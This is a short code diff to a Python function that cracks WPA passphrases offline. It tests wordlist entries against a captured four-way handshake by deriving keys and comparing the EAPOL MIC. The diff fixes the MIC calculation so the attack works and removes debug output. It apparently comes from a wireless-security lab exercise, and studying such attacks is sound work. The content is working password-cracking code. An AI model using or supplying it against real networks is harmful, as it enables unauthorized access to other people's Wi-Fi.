@@ -112,6 +112,7 @@ def crack_pass(pkts, mic_to_test) :
     passwords_file = open(wordlist_filename,'r')
     passwords = passwords_file.readlines()
     passphrase_ret = "Not found"
+    data = bytes(pkts[3][EAPOL])[:77] + b'\x00' * 22
 
     print ("\nCracking WPA Passphrase")
     print ("=============================")
@@ -128,17 +129,15 @@ def crack_pass(pkts, mic_to_test) :
         ptk = customPRF512(pmk,str.encode(A), B)
 
         #Check if it's MD5 or SHA1 with the KeyDescriptorVersion
-        kdv = int.from_bytes(pkts[0].load[0:1], byteorder='big')
+        kdv = int.from_bytes(pkts[3].load[0:1], byteorder='big')
 
         #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
         if kdv == 2:
-            mic = hmac.new(ptk[0:16],bytes(pkts[3][EAPOL]),hashlib.sha1).hexdigest()[:-8]
+            mic = hmac.new(ptk[0:16],data,hashlib.sha1).hexdigest()[:-8]
         else:
-            mic = hmac.new(ptk[0:16],bytes(pkts[3][EAPOL]),hashlib.md5).hexdigest()    
+            mic = hmac.new(ptk[0:16],data,hashlib.md5).hexdigest()    
 
         print ("Passphrase tested : ",psw)
-        print (mic)
-        print (mic_to_test)
             
         #Compare the MICs
         if hmac.compare_digest(mic, mic_to_test) :
